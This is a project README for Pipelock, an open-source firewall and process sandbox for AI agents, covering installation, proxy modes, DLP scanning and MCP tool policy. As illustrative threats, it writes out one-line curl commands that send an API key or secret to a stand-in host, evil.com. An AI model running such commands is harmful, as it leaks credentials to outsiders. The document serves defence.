<p align="center">
  <img src="assets/pipelock-logo.svg" alt="Pipelock" width="200">
</p>

# Pipelock

[![CI](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml)
[![Security](https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml)
[![Pipelock Security Scan](https://github.com/luckyPipewrench/pipelock/actions/workflows/pipelock.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/pipelock.yaml)
[![Go Report Card](https://goreportcard.com/badge/github.com/luckyPipewrench/pipelock)](https://goreportcard.com/report/github.com/luckyPipewrench/pipelock)
[![GitHub Release](https://img.shields.io/github/v/release/luckyPipewrench/pipelock)](https://github.com/luckyPipewrench/pipelock/releases)
[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/luckyPipewrench/pipelock/badge)](https://scorecard.dev/viewer/?uri=github.com/luckyPipewrench/pipelock)
[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/11948/badge?level=silver)](https://www.bestpractices.dev/projects/11948)
[![codecov](https://codecov.io/gh/luckyPipewrench/pipelock/graph/badge.svg)](https://codecov.io/gh/luckyPipewrench/pipelock)
[![CodeRabbit Reviews](https://img.shields.io/coderabbit/prs/github/luckyPipewrench/pipelock?labelColor=171717&color=FF570A&label=CodeRabbit+Reviews)](https://coderabbit.ai)
[![License](https://img.shields.io/badge/Core-Apache_2.0-blue.svg)](LICENSE) [![License](https://img.shields.io/badge/Enterprise-ELv2-orange.svg)](enterprise/LICENSE)

**Open-source [agent firewall](https://pipelab.org/agent-firewall/) and local runtime for AI agents.** Network scanning, process containment, and tool policy enforcement in a single binary.

Your agent has `$ANTHROPIC_API_KEY` in its environment, plus shell access. One request is all it takes:

```bash
curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over, unless pipelock is watching
```

**Works with:** Claude Code · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph · Cursor

[Quick Start](#quick-start) · [Integration Guides](#integration-guides) · [Docs](docs/) · [Blog](https://pipelab.org/blog/)

![Pipelock demo](assets/demo.gif)

## Quick Start

```bash
# macOS / Linux
brew install luckyPipewrench/tap/pipelock

# Or download a binary (no dependencies)
# See https://github.com/luckyPipewrench/pipelock/releases

# Or with Docker
docker pull ghcr.io/luckypipewrench/pipelock:latest

# Or from source (requires Go 1.25+)
go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest
```

**Try it in 30 seconds:**

```bash
# 1. Generate a config
pipelock generate config --preset balanced > pipelock.yaml

# 2. This should be BLOCKED (DLP catches the fake API key)
pipelock check --config pipelock.yaml --url "https://example.com/?key=sk-ant-api03-fake1234567890"

# 3. This should be ALLOWED (clean URL, no secrets)
pipelock check --config pipelock.yaml --url "https://docs.python.org/3/"
```

<details>
<summary>Forward proxy mode (zero code changes, any HTTP client)</summary>

The forward proxy intercepts standard `HTTPS_PROXY` traffic. Enable it in your config, then point any process at pipelock:

```bash
# Edit pipelock.yaml: set forward_proxy.enabled to true
pipelock run --config pipelock.yaml

export HTTPS_PROXY=http://127.0.0.1:8888
export HTTP_PROXY=http://127.0.0.1:8888

# Now every HTTP request flows through pipelock's scanner.
curl "https://example.com/?key=sk-ant-api03-fake1234567890"  # blocked
```

No SDK, no wrapper, no code changes. If the agent speaks HTTP, pipelock scans it.

</details>

<details>
<summary>Fetch proxy mode (for agents with a dedicated fetch tool)</summary>

```bash
# Start the proxy (agents connect to localhost:8888/fetch?url=...)
pipelock run --config pipelock.yaml

# For full network isolation (agent can ONLY reach pipelock):
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
docker compose up
```

</details>

<details>
<summary>Verify release integrity (SLSA provenance + SBOM)</summary>

Every release includes SLSA build provenance and an SBOM (CycloneDX). Verify with the GitHub CLI:

```bash
# Verify a downloaded binary
gh attestation verify pipelock_*_linux_amd64.tar.gz --owner luckyPipewrench

# Verify the container image (substitute the release version)
gh attestation verify oci://ghcr.io/luckypipewrench/pipelock:<version> --owner luckyPipewrench
```

</details>

## Community Rules

Pipelock supports signed rule bundles for distributable detection patterns. Install the official community bundle for additional DLP, injection, and tool-poison patterns beyond the built-in defaults:

```bash
pipelock rules install pipelock-community
```

Rules are loaded at startup and merged with built-in patterns. Bundles are Ed25519-signed and verified against the embedded keyring, which is present in release binaries (Homebrew, GitHub Releases, Docker). Source builds via `go install` must add the official public key to `trusted_keys` in their config. See [docs/rules.md](docs/rules.md) for details.

## How It Works

Pipelock is an [agent firewall](https://pipelab.org/agent-firewall/): like a WAF for web apps, it sits inline between your AI agent and the internet. It uses **capability separation**: the agent process (which has secrets) is network-restricted, while Pipelock (which holds no agent secrets) inspects all traffic through an 11-layer scanner pipeline. Deployment (Docker network isolation, Kubernetes NetworkPolicy, etc.) enforces the separation boundary.

Three proxy modes, same port:

- **Fetch proxy** (`/fetch?url=...`): Pipelock fetches the URL, extracts text, scans the response for prompt injection, and returns clean content. Best for agents that use a dedicated fetch tool.
- **Forward proxy** (`HTTPS_PROXY`): Standard HTTP CONNECT tunneling and absolute-URI forwarding. Agents use Pipelock as their system proxy with zero code changes. Hostname scanning catches blocked domains and SSRF before the tunnel opens. Request body and header DLP scanning catches secrets in POST bodies and auth headers. Optional TLS interception decrypts CONNECT tunnels for full body/header DLP and response injection scanning (requires CA setup via `pipelock tls init` and `pipelock tls install-ca`).
- **WebSocket proxy** (`/ws?url=ws://...`): Bidirectional frame scanning with DLP + injection detection on text frames. Fragment reassembly, message size limits, idle timeout, and connection lifetime controls are all built in.

```mermaid
flowchart LR
    subgraph PRIV["PRIVILEGED ZONE"]
        Agent["AI Agent\nAPI keys + credentials + source code\nNetwork-isolated by deployment"]
    end

    subgraph FW["FIREWALL ZONE"]
        Proxy["Pipelock\n11-layer scanner pipeline\nNo agent secrets"]
    end

    subgraph NET["INTERNET"]
        Web["APIs + MCP Servers + Web"]
    end

    Agent -- "fetch / CONNECT / ws / MCP" --> Proxy
    Proxy -- "scanned request" --> Web
    Web -- "response" --> Proxy
    Proxy -- "scanned content" --> Agent

    style PRIV fill:#2d1117,stroke:#f85149,color:#e6edf3
    style FW fill:#0d2818,stroke:#3fb950,color:#e6edf3
    style NET fill:#0d1b2e,stroke:#58a6ff,color:#e6edf3
    style Agent fill:#1a1a2e,stroke:#f85149,color:#e6edf3
    style Proxy fill:#0d2818,stroke:#3fb950,color:#e6edf3
    style Web fill:#0d1b2e,stroke:#58a6ff,color:#e6edf3
```

<details>
<summary>Text diagram (for terminals / non-mermaid renderers)</summary>

```
┌──────────────────────┐         ┌───────────────────────┐
│  PRIVILEGED ZONE     │         │  FIREWALL ZONE        │
│                      │         │                       │
│  AI Agent            │  IPC    │  Pipelock             │
│  - Has API keys      │────────>│  - No agent secrets   │
│  - Has credentials   │ fetch / │  - Full internet      │
│  - Restricted network│ CONNECT │  - Returns text       │
│                      │ /ws     │  - WS frame scanning  │
│                      │<────────│  - URL scanning       │
│  Can reach:          │ content │  - Audit logging      │
│  ✓ api.anthropic.com │         │                       │
│  ✓ discord.com       │         │  Can reach:           │
│  ✗ evil.com          │         │  ✓ Any URL            │
│  ✗ pastebin.com      │         │  But has:             │
└──────────────────────┘         │  ✗ No env secrets     │
                                 │  ✗ No credentials     │
                                 └───────────────────────┘
```

</details>

## Why Pipelock?

| | Pipelock | Scanners (agent-scan) | Sandboxes (srt) | Kernel agents (agentsh) |
|---|---|---|---|---|
| Secret exfiltration prevention | Yes | Partial (proxy mode) | Partial (domain-level) | Yes |
| DLP + entropy analysis | Yes | No | No | Partial |
| Prompt injection detection | Yes | Yes | No | No |
| Workspace integrity monitoring | Yes | No | No | Partial |
| MCP scanning (bidirectional + tool poisoning) | Yes | Yes | No | No |
| WebSocket proxy (frame scanning + fragment reassembly) | Yes | No | No | No |
| MCP HTTP transport (Streamable HTTP + reverse proxy) | Yes | No | No | No |
| Emergency kill switch (config + signal + file + API) | Yes | No | No | No |
| Event emission (webhook + syslog) | Yes | No | No | No |
| Tool call chain detection | Yes | No | No | No |
| Single binary, zero deps | Yes | No (Python) | No (npm) | No (kernel-level enforcement) |
| Audit logging + Prometheus | Yes | No | No | No |

Full comparison: [docs/comparison.md](docs/comparison.md)

## Security Matrix

Pipelock runs in three modes:

| Mode | Security | Web Browsing | Use Case |
|------|----------|--------------|----------|
| **strict** | Allowlist-only | None | Regulated industries, high-security |
| **balanced** | Blocks naive + detects sophisticated | Via fetch or forward proxy | Most developers (default) |
| **audit** | Logging only | Unrestricted | Evaluation before enforcement |

For agents running uncensored or abliterated models (e.g. OBLITERATUS), the [`hostile-model` preset](configs/hostile-model.yaml) layers additional defenses on top of strict mode: aggressive entropy thresholds (3.0), blanket network tool blocking, session binding, cross-request exfiltration detection, and a pre-configured kill switch. `pipelock audit` recommends this preset when it detects known guardrail-removal toolchains (currently dependency-based detection).

What each mode prevents, detects, or logs:

| Attack Vector | Strict | Balanced | Audit |
|---------------|--------|----------|-------|
| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
| Secret in URL query params | **Prevented** | **Detected** (DLP scan) | Logged |
| Base64-encoded secret in URL | **Prevented** | **Detected** (entropy scan) | Logged |
| DNS tunneling | **Prevented** | **Detected** (subdomain entropy) | Logged |
| Chunked exfiltration | **Prevented** | **Detected** (rate + data budget) | Logged |
| Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |

> **Honest assessment:** Strict mode blocks all outbound HTTP except allowlisted API domains, so there's no exfiltration channel through the proxy. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. With the sandbox enabled (`pipelock sandbox`), pipelock adds OS-level containment (Landlock + network namespaces + seccomp) on top of content inspection — the agent can't bypass the proxy because it has no direct network access.

## Features

### 11-Layer URL Scanner

Every request passes through: scheme validation, CRLF injection detection, path traversal blocking, domain blocklist, DLP pattern matching (46 built-in patterns for API keys, tokens, credentials, cryptocurrency private keys, and financial identifiers with checksum validation), path entropy analysis, subdomain entropy analysis, SSRF protection with DNS rebinding prevention, per-domain rate limiting, URL length limits, and per-domain data budgets.

DLP runs before DNS resolution, designed to catch secrets before any DNS query leaves the proxy. BIP-39 seed phrase detection uses a dedicated scanner with dictionary lookup, sliding window matching, and SHA-256 checksum validation to catch cryptocurrency mnemonic exfiltration across all transport surfaces.

See [docs/bypass-resistance.md](docs/bypass-resistance.md) for the full evasion test matrix.

### Process Sandbox (Linux)

Unprivileged process containment using Landlock LSM, network namespaces, and seccomp. No root, no Docker, no containers. The agent runs in an isolated environment with controlled filesystem access, no direct network egress, and a filtered syscall set. Works with any command — MCP servers, standalone agents, or arbitrary processes.

```bash
pipelock sandbox --config pipelock.yaml -- python agent.py
pipelock mcp proxy --sandbox --config pipelock.yaml -- npx server
```

### Response Scanning

Fetched content is scanned for prompt injection and state/control poisoning before reaching the agent. A 6-pass normalization pipeline catches zero-width character evasion, homoglyph substitution, leetspeak encoding, and base64-wrapped payloads. 19 built-in patterns cover jailbreak phrases, instruction manipulation, credential solicitation, memory persistence, and preference poisoning. Actions: `block`, `strip`, `warn`, or `ask` (human-in-the-loop terminal approval).

### MCP Proxy

Wraps any MCP server with bidirectional scanning. Three transport modes: stdio subprocess wrapping, Streamable HTTP bridging, and HTTP reverse proxy. Scans both directions: client requests checked for DLP leaks, server responses scanned for injection, and `tools/list` responses checked for poisoned descriptions and mid-session rug-pull changes.

```bash
# Wrap a local MCP server (stdio)
pipelock mcp proxy --config pipelock.yaml -- npx -y @modelcontextprotocol/server-filesystem /tmp

# Proxy a remote MCP server (HTTP)
pipelock mcp proxy --upstream http://localhost:8080/mcp

# Combined mode (fetch/forward proxy + MCP on separate ports)
pipelock run --config pipelock.yaml --mcp-listen 0.0.0.0:8889 --mcp-upstream http://localhost:3000/mcp
```

### MCP Tool Policy

Pre-execution rules that block dangerous tool calls before they reach MCP servers. Ships with 23 built-in rules covering destructive operations, credential access, reverse shells, persistence mechanisms, and encoded command execution. Shell obfuscation detection is built-in. v2.0 adds a `redirect` action that routes dangerous operations through audited wrappers instead of blocking outright.

### Tool Call Chain Detection

Detects attack patterns in sequences of MCP tool calls. Ships with 10 built-in patterns covering reconnaissance, credential theft, data staging, persistence, and exfiltration chains. Uses subsequence matching with configurable gap tolerance, so inserting innocent calls between attack steps doesn't evade detection.

### Kill Switch

Emergency deny-all with four independent activation sources: config file, SIGUSR1, sentinel file, and remote API. Any one active blocks all traffic. The API can run on a separate port so agents can't deactivate their own kill switch.

```bash
# Activate from operator machine
curl -X POST http://localhost:9090/api/v1/killswitch \
  -H "Authorization: Bearer TOKEN" -d '{"active": true}'
```

### Scan API

Evaluation endpoint for programmatic scanning. Any tool, pipeline, or control plane can submit URLs, text, or tool calls and get a structured verdict back — the proxy doesn't need to be in the request path. Four scan kinds: `url`, `dlp`, `prompt_injection`, and `tool_call`. Returns findings with scanner type, rule ID, and severity. Bearer token auth, per-token rate limiting, and Prometheus metrics.

See [docs/scan-api.md](docs/scan-api.md) for the full API reference.

### Address Protection

Detects blockchain address poisoning attacks where a lookalike address is substituted for a legitimate one. Validates addresses for ETH, BTC, SOL, and BNB chains, compares against a user-supplied allowlist, and flags similar addresses using prefix/suffix fingerprinting. Designed for agents that interact with DeFi protocols or execute transactions.

### Filesystem Sentinel

Monitors agent working directories for secrets written to disk. When an MCP subprocess writes a file containing credentials, pipelock detects it using the same DLP patterns applied to network traffic. On Linux, process lineage tracking attributes file writes to the agent's process tree. See [docs/guides/filesystem-sentinel.md](docs/guides/filesystem-sentinel.md).

### Event Emission

Forward audit events to external systems (SIEM, webhook receivers, syslog). Events are fire-and-forget and never block the proxy. Each event includes a MITRE ATT&CK technique ID where applicable (T1048 for exfiltration, T1059 for injection, T1195.002 for supply chain).

See [docs/guides/siem-integration.md](docs/guides/siem-integration.md) for log schema, forwarding patterns, and example SIEM queries.

### More Features

| Feature | What It Does |
|---------|-------------|
| **Audit Reports** | `pipelock report --input events.jsonl` generates HTML/JSON reports with risk rating, timeline, and evidence appendix. Ed25519 signing with `--sign`. ([Sample report](examples/sample-report.html)) |
| **Diagnose** | `pipelock diagnose` runs 6 local checks to verify your config works end-to-end (no network required) |
| **TLS Interception** | Optional CONNECT tunnel MITM: decrypt, scan bodies/headers/responses, re-encrypt. `pipelock tls init` generates a CA, then `pipelock tls install-ca` trusts it system-wide. |
| **Block Hints** | Opt-in `explain_blocks: true` adds fix suggestions to blocked responses |
| **Project Audit** | `pipelock audit ./project` scans for security risks and generates a tailored config |
| **Config Scoring** (v2.0) | `pipelock audit score --config pipelock.yaml` evaluates security posture across 12 categories (0-100 with letter grade). Flags overpermissive tool policies. |
| **File Integrity** | SHA256 manifests detect modified, added, or removed workspace files |
| **Git Protection** | `git diff \| pipelock git scan-diff` catches secrets before they're committed |
| **Ed25519 Signing** | Key management, file signing, and signature verification for multi-agent trust |
| **Session Profiling** | Per-session behavioral analysis (domain bursts, volume spikes) |
| **Adaptive Enforcement** | Per-session threat score with automatic escalation from warn to block, de-escalation timers, and domain burst detection |
| **Finding Suppression** | Silence known false positives via config rules or inline `pipelock:ignore` comments |
| **Multi-Agent Support** | Agent identification via `X-Pipelock-Agent` header for per-agent filtering |
| **Fleet Monitoring** | Prometheus metrics + ready-to-import [Grafana dashboard](configs/grafana-dashboard.json) |

![Pipelock Agent Egress Report showing risk rating, timeline, findings by category, and evidence appendix](examples/sample-report.png)

![Pipelock Fleet Monitor: Grafana dashboard showing traffic, security events, and WebSocket metrics](docs/assets/fleet-dashboard.jpg)

## Configuration

Generate a starter config, or use one of the 7 presets:

```bash
pipelock generate config --preset balanced > pipelock.yaml
pipelock audit ./my-project -o pipelock.yaml  # tailored to your project
```

| Preset | Mode | Action | Best For |
|--------|------|--------|----------|
| `configs/balanced.yaml` | balanced | warn | General purpose |
| `configs/strict.yaml` | strict | block | High-security |
| `configs/audit.yaml` | audit | warn | Log-only monitoring |
| `configs/claude-code.yaml` | balanced | block | Claude Code (unattended) |
| `configs/cursor.yaml` | balanced | block | Cursor IDE |
| `configs/generic-agent.yaml` | balanced | warn | New agents (tuning) |
| `configs/hostile-model.yaml` | strict | block | Uncensored/abliterated models |

Config changes are picked up automatically via file watcher or SIGHUP (most fields hot-reload without restart).

Full reference with all fields, defaults, and hot-reload behavior: **[docs/configuration.md](docs/configuration.md)**

## Integration Guides

- **[Claude Code](docs/guides/claude-code.md):** MCP proxy setup, `.claude.json` configuration
- **[OpenAI Agents SDK](docs/guides/openai-agents.md):** `MCPServerStdio`, multi-agent handoffs
- **[Google ADK](docs/guides/google-adk.md):** `McpToolset`, `StdioConnectionParams`
- **[AutoGen](docs/guides/autogen.md):** `StdioServerParams`, `mcp_server_tools()`
- **[CrewAI](docs/guides/crewai.md):** `MCPServerStdio` wrapping, `MCPServerAdapter`
- **[LangGraph](docs/guides/langgraph.md):** `MultiServerMCPClient`, `StateGraph`
- **Cursor:** use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md)
- **[OpenClaw](docs/guides/openclaw.md):** Gateway sidecar, init container, `generate mcporter` config wrapping

## CI Integration

### GitHub Action

Scan your project for agent security risks on every PR. No Go toolchain needed.

```yaml
# .github/workflows/pipelock.yaml
- uses: luckyPipewrench/pipelock@v1
  with:
    scan-diff: 'true'
    fail-on-findings: 'true'
```

The action downloads a pre-built binary, runs `pipelock audit` on your project, scans the PR diff for leaked secrets, and uploads the audit report as a workflow artifact. Critical findings produce inline annotations on the PR diff.

See [`examples/ci-workflow.yaml`](examples/ci-workflow.yaml) for a complete workflow.

### Reusable Workflow

For even simpler adoption, call the reusable workflow directly:

```yaml
# .github/workflows/security.yaml
jobs:
  pipelock:
    uses: luckyPipewrench/pipelock/.github/workflows/reusable-scan.yml@v1
    with:
      fail-on-critical: true
```

That's the entire workflow. Everything else is defaults: auto-generated config, PR diff scanning, artifact upload.

## Deployment

```bash
# Docker
docker pull ghcr.io/luckypipewrench/pipelock:latest
docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
  ghcr.io/luckypipewrench/pipelock:latest \
  run --config /config/pipelock.yaml --listen 0.0.0.0:8888

# Network-isolated agent (Docker Compose)
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
docker compose up
```

For production deployment recipes (Docker Compose with network isolation, Kubernetes sidecar + NetworkPolicy, iptables/nftables, macOS PF): **[docs/guides/deployment-recipes.md](docs/guides/deployment-recipes.md)**

<details>
<summary>API Reference</summary>

```bash
# Fetch a URL (returns extracted text content)
curl "http://localhost:8888/fetch?url=https://example.com"

# Forward proxy (when forward_proxy.enabled: true)
# Set HTTPS_PROXY=http://localhost:8888 and use any HTTP client normally.
curl -x http://localhost:8888 https://example.com

# WebSocket proxy (when websocket_proxy.enabled: true)
# wscat -c "ws://localhost:8888/ws?url=ws://upstream:9090/path"

# Health check
curl "http://localhost:8888/health"

# Prometheus metrics
curl "http://localhost:8888/metrics"

# JSON stats (top blocked domains, scanner hits, tunnels, block rate)
curl "http://localhost:8888/stats"

# Kill switch API (when api_listen is set, use that port instead)
curl -X POST http://localhost:9090/api/v1/killswitch \
  -H "Authorization: Bearer TOKEN" -d '{"active": true}'
curl http://localhost:9090/api/v1/killswitch/status \
  -H "Authorization: Bearer TOKEN"
```

**Fetch response:**
```json
{
  "url": "https://example.com",
  "agent": "my-bot",
  "status_code": 200,
  "content_type": "text/html",
  "title": "Example Domain",
  "content": "This domain is for use in illustrative examples...",
  "blocked": false
}
```

**Health response:**
```json
{
  "status": "healthy",
  "version": "x.y.z",
  "mode": "balanced",
  "uptime_seconds": 3600.5,
  "dlp_patterns": 46,
  "response_scan_enabled": true,
  "kill_switch_active": false
}
```

</details>

<details>
<summary>OWASP Agentic Top 10 Coverage</summary>

| Threat | Coverage |
|--------|----------|
| ASI01 Agent Goal Hijack | **Strong:** bidirectional MCP + response scanning |
| ASI02 Tool Misuse | **Partial:** proxy as controlled tool, MCP scanning |
| ASI03 Identity & Privilege Abuse | **Strong:** capability separation + SSRF protection |
| ASI04 Supply Chain Vulnerabilities | **Partial:** integrity monitoring + MCP scanning |
| ASI05 Unexpected Code Execution | **Moderate:** HITL approval, fail-closed defaults |
| ASI06 Memory & Context Poisoning | **Moderate:** injection detection on fetched content |
| ASI07 Insecure Inter-Agent Communication | **Partial:** agent ID, integrity, signing |
| ASI08 Cascading Failures | **Moderate:** fail-closed architecture, rate limiting |
| ASI09 Human-Agent Trust Exploitation | **Partial:** HITL modes, audit logging |
| ASI10 Rogue Agents | **Strong:** domain allowlist + rate limiting + capability separation |

Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)

</details>

## Docs

| Document | What's In It |
|----------|-------------|
| [Scan API](docs/scan-api.md) | Evaluation endpoint for programmatic URL/text/tool-call scanning |
| [Configuration Reference](docs/configuration.md) | All config fields, defaults, hot-reload behavior, presets |
| [Deployment Recipes](docs/guides/deployment-recipes.md) | Docker Compose, K8s sidecar + NetworkPolicy, iptables, macOS PF |
| [Bypass Resistance](docs/bypass-resistance.md) | Known evasion techniques, mitigations, and honest limitations |
| [Known Attacks Blocked](docs/attacks-blocked.md) | Real attacks with repro snippets and pipelock config that stops them |
| [Policy Spec v0.1](docs/policy-spec-v0.1.md) | Portable agent firewall policy format |
| [SIEM Integration](docs/guides/siem-integration.md) | Log schema, forwarding patterns, KQL/SPL/EQL queries |
| [Metrics Reference](docs/metrics.md) | All 30 Prometheus metrics, alert rule templates |
| [OWASP Agentic Top 10](docs/owasp-mapping.md) | Coverage against OWASP Agentic AI Top 10 |
| [OWASP MCP Top 10](docs/compliance/owasp-mcp-top10.md) | Coverage against OWASP MCP Top 10 |
| [EU AI Act Mapping](docs/compliance/eu-ai-act-mapping.md) | EU AI Act Article 9-26 compliance mapping |
| [NIST 800-53 Mapping](docs/compliance/nist-800-53.md) | NIST SP 800-53 Rev. 5 security controls mapping |
| [Comparison](docs/comparison.md) | How pipelock compares to agent-scan, srt, agentsh, MCP Gateway |
| [Finding Suppression](docs/guides/suppression.md) | Rule names, path matching, inline comments, CI integration |
| [OpenClaw Guide](docs/guides/openclaw.md) | Gateway sidecar, init container, `generate mcporter` wrapping |
| [Security Assurance](docs/security-assurance.md) | Security model, trust boundaries, supply chain |
| [Transport Modes](docs/guides/transport-modes.md) | Comparison of all proxy modes and their scanning capabilities |
| [JetBrains Guide](docs/guides/jetbrains.md) | Junie MCP proxy wrapping for IntelliJ, PyCharm, GoLand, etc. |
| [EU AI Act Mapping](docs/compliance/eu-ai-act-mapping.md) | Article-by-article compliance mapping |
| [Community Rules](docs/rules.md) | Install, configure, and create signed rule bundles |

## Project Structure

```text
cmd/pipelock/          CLI entry point
internal/
  cli/                 20+ Cobra commands (run, check, generate, mcp, integrity, ...)
  config/              YAML config, validation, defaults, hot-reload (fsnotify)
  scanner/             11-layer URL scanning pipeline + response injection detection
  audit/               Structured JSON logging (zerolog) + event emission dispatch
  proxy/               HTTP proxy: fetch, forward (CONNECT), WebSocket, DNS pinning, TLS interception
  certgen/             ECDSA P-256 CA + leaf certificate generation, cache
  mcp/                 MCP proxy + bidirectional scanning + tool poisoning + chains
  killswitch/          Emergency deny-all (4 sources) + port-isolated API
  emit/                Event emission (webhook + syslog sinks)
  metrics/             Prometheus metrics + JSON stats
  normalize/           Unicode normalization (NFKC, confusables, combining marks)
  integrity/           SHA256 file integrity monitoring
  signing/             Ed25519 key management
  gitprotect/          Git diff scanning for secrets
  hitl/                Human-in-the-loop terminal approval
  report/              HTML/JSON audit report generation from JSONL event logs
  projectscan/         Project directory scanning for audit command
  addressprotect/      Blockchain address validation and poisoning detection
  seedprotect/         BIP-39 seed phrase detection (dictionary, sliding window, checksum)
  rules/               Community rule bundle loading, verification, and CLI
enterprise/            Multi-agent features (ELv2, see enterprise/LICENSE)
configs/               7 preset config files
docs/                  Guides, references, compliance mappings
```

## Testing

Pipelock is tested like a security product, not just a developer tool. The open-source core is covered by thousands of unit, integration, and end-to-end tests across the proxy, scanner, MCP, WebSocket, and policy layers. In addition, we maintain a separate private adversarial test suite that exercises real-world attack classes against the production binary.

That suite covers the problems an agent firewall actually has to stop: secret exfiltration, prompt injection, SSRF, tool poisoning, and transport-layer evasions across HTTP, WebSocket, and MCP. We publish the methodology and coverage areas; we do not publish live bypass payloads that would lower attacker cost. Every bypass graduates into a regression test before release.

This is not security through obscurity. Pipelock's detection and enforcement logic is open source and inspectable. Public tests remain extensive. The private adversarial suite exists to continuously regression-test bypass classes without handing out a replay script.

For more detail on the security model, trust boundaries, and known limitations, see the [Security Assurance Case](docs/security-assurance.md).

### Metrics

Canonical metrics, updated each release.

| Metric | Value |
|--------|-------|
| Go tests (with `-race`) | 7,000+ |
| Statement coverage | 90%+ |
| Evasion techniques tested | 230+ |
| Scanner pipeline overhead | ~21μs per URL scan ([performance details](docs/performance.md)) |
| CI matrix | Go 1.25 + 1.26, CodeQL, golangci-lint |
| Supply chain | SLSA provenance, CycloneDX SBOM, cosign signatures |
| OpenSSF Scorecard | [Live score](https://scorecard.dev/viewer/?uri=github.com/luckyPipewrench/pipelock) |

Run `make test` to verify locally. Performance data: [docs/performance.md](docs/performance.md). Raw benchmarks: [docs/benchmarks.md](docs/benchmarks.md).

Independent benchmark: [agent-egress-bench](https://github.com/luckyPipewrench/agent-egress-bench) (72 attack cases across 8 categories, tool-neutral).

## Credits

- Architecture influenced by [Anthropic's Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) and [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- Threat model informed by [OWASP Agentic AI Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to other tools in this space
- Security review contributions from Dylan Corrales

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

If Pipelock is useful, please [star this repository](https://github.com/luckyPipewrench/pipelock). It helps others find the project.

## License

Pipelock core is licensed under the **Apache License 2.0**. Copyright 2026 Joshua Waldrep.

Multi-agent features (per-agent identity, budgets, and configuration isolation)
are in the `enterprise/` directory, gated by the `enterprise` build tag and licensed
under the **Elastic License 2.0 (ELv2)**. These features activate with a valid license key.

The open-source core works independently without paid features. All scanning, detection,
and single-agent protection is free.

Pre-built release artifacts (Homebrew, GitHub releases, Docker images) include paid-tier
code that activates with a valid license key. Building from source with `go install` or the
repository `Dockerfile` produces a Community-only binary.

See [LICENSE](LICENSE) for the Apache 2.0 text and [enterprise/LICENSE](enterprise/LICENSE) for the ELv2 text.
